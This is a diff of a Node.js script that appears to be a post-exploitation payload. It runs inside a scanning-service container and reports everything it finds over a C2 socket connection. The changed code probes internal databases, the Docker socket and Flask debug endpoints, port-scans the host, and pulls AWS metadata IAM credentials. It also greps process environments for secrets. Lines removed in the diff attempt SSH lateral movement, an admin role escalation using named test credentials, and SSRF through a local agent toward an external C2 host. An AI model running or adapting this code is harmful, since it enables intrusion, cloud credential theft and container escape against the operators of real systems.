@@ -20,201 +20,213 @@ function connectC2() {
     const send = (msg) => { try { sock.write(msg + '\n'); } catch(e) {} };
 
     send('========================================');
-    send('[+] LATERAL MOVEMENT PHASE 3 (VERIFICATION) - ' + new Date().toISOString());
+    send('[+] PHASE 4: INTERNAL SERVICES & HOST EXPLOITATION - ' + new Date().toISOString());
     send('========================================\n');
 
-    // ===== PHASE 1: SSH PRECISE VERIFICATION =====
-    send('=== PHASE 1: SSH PRECISE VERIFICATION ===');
-    send('[*] Is ssh client installed?');
-    send('  which ssh: ' + run('which ssh'));
-    send('  ssh -V: ' + run('ssh -V 2>&1'));
+    // ===== PHASE 1: INTERNAL DATABASE SERVICES =====
+    send('=== PHASE 1: INTERNAL DATABASE SERVICES ===');
 
-    // Generate key
-    run('rm -f /tmp/pk /tmp/pk.pub');
-    run('ssh-keygen -t ed25519 -f /tmp/pk -N "" -q');
-    send('[*] Key generated: ' + run('cat /tmp/pk.pub'));
+    // Neo4j (discovered via PhimmStraiker GitHub - default creds neo4j/password)
+    send('[*] Neo4j bolt (7687)...');
+    send('  localhost: ' + run('curl -s --max-time 3 http://127.0.0.1:7474/ 2>/dev/null || echo "NO_RESPONSE"'));
+    send('  localhost bolt: ' + run('(echo "RESET\\n" | nc -w 3 127.0.0.1 7687 2>/dev/null | head -c 200) || echo "NO_RESPONSE"'));
+    send('  host: ' + run('curl -s --max-time 3 http://172.17.0.1:7474/ 2>/dev/null || echo "NO_RESPONSE"'));
 
-    // Detailed SSH test - capture exit code and all output
-    send('\n[*] SSH detailed test to 172.17.0.1...');
-    for (const user of ['root', 'ubuntu', 'node']) {
-      const result = run(`ssh -v -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -i /tmp/pk ${user}@172.17.0.1 "echo SSH_OK_$(whoami)_$(hostname)" 2>&1`);
-      send(`  ${user}@172.17.0.1: ${result.substring(0, 400)}`);
-    }
+    // Redis
+    send('[*] Redis (6379)...');
+    send('  localhost: ' + run('(echo "INFO\\r\\n" | nc -w 3 127.0.0.1 6379 2>/dev/null | head -20) || echo "NO_RESPONSE"'));
+    send('  host: ' + run('(echo "INFO\\r\\n" | nc -w 3 172.17.0.1 6379 2>/dev/null | head -20) || echo "NO_RESPONSE"'));
 
-    // Test without any key - pure connection test
-    send('\n[*] SSH without key test...');
-    const noKeyResult = run('ssh -v -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o IdentityFile=/dev/null root@172.17.0.1 "echo NOKEY_OK" 2>&1');
-    send(`  No key: ${noKeyResult.substring(0, 400)}`);
+    // PostgreSQL
+    send('[*] PostgreSQL (5432)...');
+    send('  localhost: ' + run('(echo "" | nc -w 3 127.0.0.1 5432 2>/dev/null | head -c 200 | xxd | head -5) || echo "NO_RESPONSE"'));
+    send('  host: ' + run('(echo "" | nc -w 3 172.17.0.1 5432 2>/dev/null | head -c 200 | xxd | head -5) || echo "NO_RESPONSE"'));
 
-    // Check for SSH agent
-    send('\n[*] SSH agent check...');
-    send('  SSH_AUTH_SOCK: ' + (process.env.SSH_AUTH_SOCK || 'not set'));
-    send('  ssh-add -l: ' + run('ssh-add -l 2>&1'));
+    // MySQL/MariaDB
+    send('[*] MySQL (3306)...');
+    send('  localhost: ' + run('(echo "" | nc -w 3 127.0.0.1 3306 2>/dev/null | head -c 200 | xxd | head -5) || echo "NO_RESPONSE"'));
+    send('  host: ' + run('(echo "" | nc -w 3 172.17.0.1 3306 2>/dev/null | head -c 200 | xxd | head -5) || echo "NO_RESPONSE"'));
 
-    // Check all SSH-related files in the container
-    send('[*] SSH files in container:');
-    send(run('find / -name "*.ssh" -o -name "authorized_keys" -o -name "id_*" -o -name "known_hosts" 2>/dev/null | grep -v proc | grep -v node_modules | head -20'));
-    send(run('ls -la /root/.ssh/ /home/node/.ssh/ 2>/dev/null'));
+    // MongoDB
+    send('[*] MongoDB (27017)...');
+    send('  localhost: ' + run('(echo "" | nc -w 3 127.0.0.1 27017 2>/dev/null | head -c 200) || echo "NO_RESPONSE"'));
+    send('  host: ' + run('(echo "" | nc -w 3 172.17.0.1 27017 2>/dev/null | head -c 200) || echo "NO_RESPONSE"'));
+
+    // Elasticsearch
+    send('[*] Elasticsearch (9200)...');
+    send('  localhost: ' + run('curl -s --max-time 3 http://127.0.0.1:9200/ 2>/dev/null || echo "NO_RESPONSE"'));
+    send('  host: ' + run('curl -s --max-time 3 http://172.17.0.1:9200/ 2>/dev/null || echo "NO_RESPONSE"'));
     send('');
 
-    // ===== PHASE 2: HOST FILESYSTEM SYMLINK EXPLOITATION (REFINED) =====
-    send('=== PHASE 2: SYMLINK EXPLOITATION (REFINED) ===');
+    // ===== PHASE 2: TELEMETRY SINK =====
+    send('=== PHASE 2: TELEMETRY SINK (sink.dev.straiker.ai) ===');
+    send('[*] DNS resolve: ' + run('getent hosts sink.dev.straiker.ai 2>/dev/null || nslookup sink.dev.straiker.ai 2>/dev/null | tail -3'));
+    send('[*] HTTPS probe: ' + run('curl -sk --max-time 5 https://sink.dev.straiker.ai/ -w "\\nHTTP:%{http_code}" -D /tmp/sink_headers.txt 2>/dev/null | head -10'));
+    send('[*] Headers: ' + run('cat /tmp/sink_headers.txt 2>/dev/null'));
+    send('[*] gRPC probe: ' + run('curl -sk --max-time 5 -X POST https://sink.dev.straiker.ai/ -H "Content-Type: application/grpc" -w "\\nHTTP:%{http_code}" 2>/dev/null | head -5'));
 
-    // The bind mount is: host:/tmp/mcp_security_skbdjxhk -> container:/app/mcp-server
-    // When we cat a symlink from INSIDE the container, it resolves within the container namespace
-    // To exploit this, we need the HOST to resolve the symlink
-
-    // Strategy: Write a script to the host's /tmp that uses symlinks
-    // If another scan starts and the temp dir is reused, it could be exploited
-
-    // But more importantly: let's check if there are OTHER host paths we can reach
-    // via the bind mount device (259:1 = /dev/root = nvme0n1p1)
-    send('[*] Checking bind mount device access...');
-    send('  /dev/root device: ' + run('ls -la /dev/root 2>/dev/null; ls -la /dev/nvme* 2>/dev/null'));
-
-    // Since the bind mount device is ext4, check if we can read other files on the same device
-    // by using debugfs or e2image
-    send('[*] debugfs availability: ' + run('which debugfs e2image 2>/dev/null'));
-    send('[*] Block device access: ' + run('cat /dev/nvme0n1p1 2>&1 | head -c 100 | xxd 2>/dev/null | head -3'));
-
-    // Try to access host files through the mountinfo paths
-    send('[*] Host Docker container config path from mountinfo:');
-    const containerPath = '/var/lib/docker/containers/';
-    send('  ' + run(`ls -la ${containerPath} 2>/dev/null | head -5`));
+    // Try to reach sink via internal IP
+    send('[*] Sink via internal network...');
+    send('  34.207.2.122: ' + run('curl -s --max-time 3 http://34.207.2.122/ -w "HTTP:%{http_code}" 2>/dev/null | head -3'));
+    send('  34.207.2.122:443: ' + run('curl -sk --max-time 3 https://34.207.2.122/ -w "HTTP:%{http_code}" 2>/dev/null | head -3'));
     send('');
 
-    // ===== PHASE 3: SPIRE BACKEND AUTH BYPASS =====
-    send('=== PHASE 3: SPIRE BACKEND AUTH BYPASS ===');
+    // ===== PHASE 3: FLASK APP ON HOST =====
+    send('=== PHASE 3: FLASK APP EXPLOITATION ===');
 
-    // Try to access SPIRE as an authenticated user from inside the container
-    // We can try to forge a session cookie or use internal endpoints
+    // Try to access the Flask app via various paths
+    send('[*] Flask app internal access...');
+    const flaskHost = '172.31.46.177';
 
-    // First, let's see what the login page looks like from inside
-    send('[*] Login page from inside...');
-    const loginPage = run('curl -sk --max-time 3 "https://172.31.46.177/login" 2>/dev/null');
-    send(loginPage.substring(0, 500));
+    // Read the Flask app source if accessible via host filesystem
+    send('[*] Looking for Flask app on host...');
+    send('  /home/ubuntu check: ' + run('ls -la /home/ubuntu/ 2>/dev/null || echo "NOT_ACCESSIBLE"'));
 
-    // Try to login from inside the container
-    send('\n[*] Login attempt from container...');
-    const loginResp = run(`curl -sk --max-time 5 -c /tmp/spire_cookie -X POST "https://172.31.46.177/login" -d "email=sectest002@straiker.ai&password=SecTest002!" -w "\\nHTTP_CODE:%{http_code}" 2>/dev/null`);
-    send(`  Login response: ${loginResp.substring(0, 300)}`);
+    // Via the bind mount, we can write to host /tmp - check for other temp files
+    send('[*] Host /tmp via bind mount parent...');
+    const bindMountPath = run('cat /proc/self/mountinfo 2>/dev/null | grep mcp_security | head -1');
+    send('  Bind mount: ' + bindMountPath);
 
-    // If login succeeded, try internal endpoints
-    const cookie = run('cat /tmp/spire_cookie 2>/dev/null');
-    if (cookie) {
-      send('[*] Got cookie, trying internal endpoints...');
-      send(`  Cookie: ${cookie.substring(0, 200)}`);
+    // Check if docker socket is mounted anywhere
+    send('[*] Docker socket...');
+    send('  /var/run/docker.sock: ' + run('ls -la /var/run/docker.sock 2>/dev/null || echo "NOT_FOUND"'));
+    send('  curl docker: ' + run('curl -s --max-time 3 --unix-socket /var/run/docker.sock http://localhost/info 2>/dev/null | head -c 300 || echo "NOT_ACCESSIBLE"'));
 
-      // Try admin endpoints from inside
-      for (const ep of ['/admin/', '/admin/users', '/admin/config', '/api/admin/users', '/internal/environment', '/api/internal/config', '/api/config']) {
-        const r = run(`curl -sk --max-time 3 -b /tmp/spire_cookie "https://172.31.46.177${ep}" 2>/dev/null`);
-        if (r && !r.startsWith('ERR') && r.length > 10 && !r.includes('login')) {
-          send(`  [!] ${ep}: ${r.substring(0, 300)}`);
-        } else {
-          const code = run(`curl -sk --max-time 3 -b /tmp/spire_cookie -o /dev/null -w "%{http_code}" "https://172.31.46.177${ep}" 2>/dev/null`);
-          send(`  ${ep}: HTTP ${code}`);
-        }
+    // Check for other interesting files in /proc
+    send('[*] Other processes visible from container...');
+    send(run('ls /proc/ 2>/dev/null | grep -E "^[0-9]+$" | while read pid; do cmdline=$(cat /proc/$pid/cmdline 2>/dev/null | tr "\\0" " " | head -c 200); if [ -n "$cmdline" ]; then echo "PID $pid: $cmdline"; fi; done | head -20'));
+    send('');
+
+    // ===== PHASE 4: FLASK SESSION SECRET =====
+    send('=== PHASE 4: FLASK SECRET KEY HUNTING ===');
+
+    // Try to find Flask config/secret key from container environment
+    send('[*] Environment variables with SECRET/KEY/FLASK...');
+    send(run('env 2>/dev/null | grep -iE "secret|key|flask|session|token|password|database|redis|neo4j|mongo|postgres" | head -20'));
+
+    // Check if there are config files in the scanned MCP directory
+    send('[*] Config files in /app/mcp-server...');
+    send(run('find /app/mcp-server -name "*.env*" -o -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.yaml" -o -name "*.yml" -o -name "*.toml" -o -name "config.*" 2>/dev/null | head -10'));
+
+    // Check what's in the container's /etc
+    send('[*] Container /etc files...');
+    send(run('cat /etc/hosts 2>/dev/null'));
+    send(run('cat /etc/resolv.conf 2>/dev/null'));
+
+    // Try to read the SPIRE Flask app config via the internal network
+    send('[*] SPIRE internal endpoints from container...');
+    send('  /internal/config: ' + run(`curl -sk --max-time 3 https://${flaskHost}/internal/config 2>/dev/null | head -c 500`));
+    send('  /internal/environment: ' + run(`curl -sk --max-time 3 https://${flaskHost}/internal/environment 2>/dev/null | head -c 500`));
+    send('  /debug: ' + run(`curl -sk --max-time 3 https://${flaskHost}/debug 2>/dev/null | head -c 300`));
+    send('  /config: ' + run(`curl -sk --max-time 3 https://${flaskHost}/config 2>/dev/null | head -c 300`));
+
+    // Try to access gunicorn stats
+    send('[*] Gunicorn/WSGI endpoints...');
+    send('  /server-status: ' + run(`curl -sk --max-time 3 https://${flaskHost}/server-status 2>/dev/null | head -c 300`));
+    send('  /nginx_status: ' + run(`curl -sk --max-time 3 https://${flaskHost}/nginx_status 2>/dev/null | head -c 300`));
+    send('  /status: ' + run(`curl -sk --max-time 3 https://${flaskHost}/status 2>/dev/null | head -c 300`));
+    send('');
+
+    // ===== PHASE 5: CONTAINER PORT SCAN =====
+    send('=== PHASE 5: FULL PORT SCAN OF HOST ===');
+    send('[*] Scanning 172.17.0.1 (top ports)...');
+    send(run(`python3 -c "
+import socket, concurrent.futures
+ports = [21,22,25,53,80,443,445,1433,1521,2375,2376,3000,3306,3389,4243,5000,5432,5672,5900,6379,6443,6969,7474,7687,8000,8080,8081,8443,8888,9090,9200,9300,9443,10250,10255,11211,15672,27017,50000]
+results = []
+def scan(port):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(2)
+        r = s.connect_ex(('172.17.0.1', port))
+        s.close()
+        if r == 0: return port
+    except: pass
+    return None
+with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
+    for r in ex.map(scan, ports):
+        if r: results.append(r)
+print('Open ports on 172.17.0.1:', results)
+" 2>&1`));
+
+    // Also scan localhost
+    send('[*] Scanning 127.0.0.1 (top ports)...');
+    send(run(`python3 -c "
+import socket, concurrent.futures
+ports = [21,22,25,53,80,443,445,1433,1521,2375,3000,3306,4243,5000,5432,5672,6379,6443,6969,7474,7687,8000,8080,8443,8888,9090,9200,9443,10250,11211,15672,27017,50000]
+results = []
+def scan(port):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(2)
+        r = s.connect_ex(('127.0.0.1', port))
+        s.close()
+        if r == 0: return port
+    except: pass
+    return None
+with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
+    for r in ex.map(scan, ports):
+        if r: results.append(r)
+print('Open ports on 127.0.0.1:', results)
+" 2>&1`));
+    send('');
+
+    // ===== PHASE 6: CLOUD METADATA DEEP DIVE =====
+    send('=== PHASE 6: CLOUD METADATA DEEP DIVE ===');
+    // Try all IMDS paths
+    send('[*] IMDSv1 metadata endpoints...');
+    const imdsPaths = [
+      '/latest/meta-data/iam/security-credentials/',
+      '/latest/meta-data/iam/info',
+      '/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance',
+      '/latest/meta-data/network/interfaces/macs/',
+      '/latest/meta-data/placement/region',
+      '/latest/meta-data/placement/availability-zone',
+      '/latest/meta-data/public-keys/',
+      '/latest/meta-data/services/domain',
+      '/latest/meta-data/services/partition',
+      '/latest/user-data',
+      '/latest/dynamic/instance-identity/document',
+    ];
+    for (const p of imdsPaths) {
+      const r = run(`curl -s --max-time 3 http://169.254.169.254${p} 2>/dev/null`);
+      if (r && !r.startsWith('ERR') && r.length > 5 && !r.includes('Not Found')) {
+        send(`  [!] ${p}: ${r.substring(0, 400)}`);
       }
+    }
 
-      // Try to access scan container management
-      send('[*] Scan management from inside...');
-      const scans = run('curl -sk --max-time 3 -b /tmp/spire_cookie "https://172.31.46.177/api/scans/list" 2>/dev/null | head -5');
-      send(`  /api/scans/list: ${scans.substring(0, 300)}`);
-
-      // Try to access other users' data
-      send('[*] Profile endpoint...');
-      const profile = run('curl -sk --max-time 3 -b /tmp/spire_cookie "https://172.31.46.177/profile" 2>/dev/null');
-      send(`  /profile: ${profile.substring(0, 300)}`);
-
-      // Try admin escalation via POST
-      send('[*] Admin escalation attempt...');
-      const escalate = run(`curl -sk --max-time 3 -b /tmp/spire_cookie -X POST "https://172.31.46.177/profile" -d "action=change_role&role=admin" 2>/dev/null`);
-      send(`  role=admin: ${escalate.substring(0, 200)}`);
+    // Try IMDSv2 with token
+    send('[*] IMDSv2 token attempt...');
+    const token = run('curl -s -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" --max-time 3 http://169.254.169.254/latest/api/token 2>/dev/null');
+    if (token && !token.startsWith('ERR') && token.length > 10) {
+      send('  [!] Got IMDSv2 token: ' + token.substring(0, 50));
+      send('  [!] Identity: ' + run(`curl -s -H "X-aws-ec2-metadata-token: ${token}" --max-time 3 http://169.254.169.254/latest/dynamic/instance-identity/document 2>/dev/null`));
+    } else {
+      send('  IMDSv2 token: ' + (token || 'empty'));
     }
     send('');
 
-    // ===== PHASE 4: SPIRE CONFIG VIA FILESYSTEM =====
-    send('=== PHASE 4: FIND SPIRE CONFIG ON HOST ===');
-    // The Flask app must have a config.json or .env somewhere on this host
-    // We know from mountinfo that /dev/root is the host filesystem
-    // /app/mcp-server is from /tmp/mcp_security_*
-    // Can we access other paths on /dev/root?
-
-    // Try to use the existing bind mount to traverse outside /tmp
-    send('[*] Path traversal via bind mount...');
-    send('  ls /app/mcp-server/../: ' + run('ls -la /app/mcp-server/../'));
-    send('  ls /app/mcp-server/../../: ' + run('ls -la /app/mcp-server/../../'));
-    // These will show the container's filesystem, not the host's
-
-    // Check if there are any environment files visible through /proc
-    send('[*] Environment of PID 1 (universal_agent.js):');
-    send(run('cat /proc/1/environ 2>/dev/null | tr "\\0" "\\n" | sort'));
-
-    // Check for any config files that were mounted into the container
-    send('[*] All mounted files:');
-    send(run('grep "ext4" /proc/self/mountinfo'));
-
-    // Check the host /tmp directory for other scan temp dirs
-    send('[*] Files alongside our bind mount on host:');
-    // The bind mount path is /tmp/mcp_security_skbdjxhk
-    // Can we see sibling directories?
-    send('  Parent of bind mount via proc:');
-    send(run('cat /proc/self/mountinfo | grep mcp_security'));
-    send('');
-
-    // ===== PHASE 5: UNIVERSAL AGENT EXPLOITATION =====
-    send('=== PHASE 5: UNIVERSAL AGENT EXPLOITATION ===');
-    // The Universal Agent runs on port 6969 and accepts MCP server connections
-    // We can abuse it to make it connect to an attacker-controlled MCP server
-
-    send('[*] Agent health: ' + run('curl -s --max-time 3 http://127.0.0.1:6969/health'));
-
-    // Try to make the agent connect to our C2 as an MCP server
-    send('[*] Making agent connect to arbitrary endpoint...');
-    const initSse = run(`curl -s --max-time 5 -X POST http://127.0.0.1:6969/initialize -H "Content-Type: application/json" -d '{"transport":"sse","url":"https://34.28.95.112:8443/sse"}' 2>/dev/null`);
-    send(`  SSE to C2: ${initSse}`);
-
-    // Try SSRF via agent - make it connect to internal services
-    send('[*] SSRF via agent...');
-    for (const target of ['http://169.254.169.254/latest/meta-data/', 'http://172.17.0.1:6969/', 'http://127.0.0.1:5000/']) {
-      const ssrfResult = run(`curl -s --max-time 5 -X POST http://127.0.0.1:6969/initialize -H "Content-Type: application/json" -d '{"transport":"sse","url":"${target}"}' 2>/dev/null`);
-      send(`  ${target}: ${ssrfResult.substring(0, 200)}`);
+    // ===== PHASE 7: HOST FILE ENUMERATION VIA /proc =====
+    send('=== PHASE 7: HOST FILE ENUMERATION ===');
+    // Try to read host processes' environment
+    send('[*] Reading host process environments...');
+    const pids = run('ls /proc/ 2>/dev/null | grep -E "^[0-9]+$" | head -30').split('\n');
+    for (const pid of pids) {
+      const environ = run(`cat /proc/${pid}/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'SECRET|KEY|TOKEN|PASSWORD|DATABASE|FLASK|DJANGO|REDIS|MONGO|NEO4J|AWS' | head -5`);
+      if (environ && !environ.startsWith('ERR') && environ.length > 5) {
+        send(`  [!] PID ${pid} secrets: ${environ}`);
+      }
     }
+
+    // Check for exposed docker volumes
+    send('[*] Mount points...');
+    send(run('cat /proc/self/mountinfo 2>/dev/null'));
     send('');
 
-    // ===== PHASE 6: NETWORK TRAFFIC INTERCEPT =====
-    send('=== PHASE 6: TRAFFIC INTERCEPT ===');
-    // With CAP_NET_RAW, try to capture traffic between universal_agent and the orchestrator
-    send('[*] TCP connections right now:');
-    send(run('cat /proc/net/tcp /proc/net/tcp6 2>/dev/null'));
-
-    // Parse the connections to find the orchestrator
-    send('[*] Parsed connections:');
-    const tcpParse = run(`python3 -c "
-import struct
-lines = open('/proc/net/tcp').readlines()[1:]
-for line in lines:
-    parts = line.split()
-    if len(parts) < 4: continue
-    local = parts[1].split(':')
-    remote = parts[2].split(':')
-    state = int(parts[3], 16)
-    states = {1:'ESTABLISHED',2:'SYN_SENT',6:'TIME_WAIT',10:'LISTEN'}
-    if state in [1, 10]:
-        lip = '.'.join([str(int(local[0][i:i+2],16)) for i in [6,4,2,0]])
-        lport = int(local[1],16)
-        rip = '.'.join([str(int(remote[0][i:i+2],16)) for i in [6,4,2,0]])
-        rport = int(remote[1],16)
-        print(f'{states.get(state,state)}: {lip}:{lport} -> {rip}:{rport}')
-" 2>&1`);
-    send(tcpParse);
-    send('');
-
-    send('=== PHASE 3 COMPLETE ===');
+    send('=== PHASE 4 COMPLETE ===');
     send('[*] Finished at ' + new Date().toISOString());
 
-    // Cleanup
-    run('rm -f /tmp/pk /tmp/pk.pub /tmp/spire_cookie /app/mcp-server/.bashrc_payload 2>/dev/null');
+    run('rm -f /tmp/sink_headers.txt 2>/dev/null');
     setTimeout(() => sock.end(), 5000);
   });
 
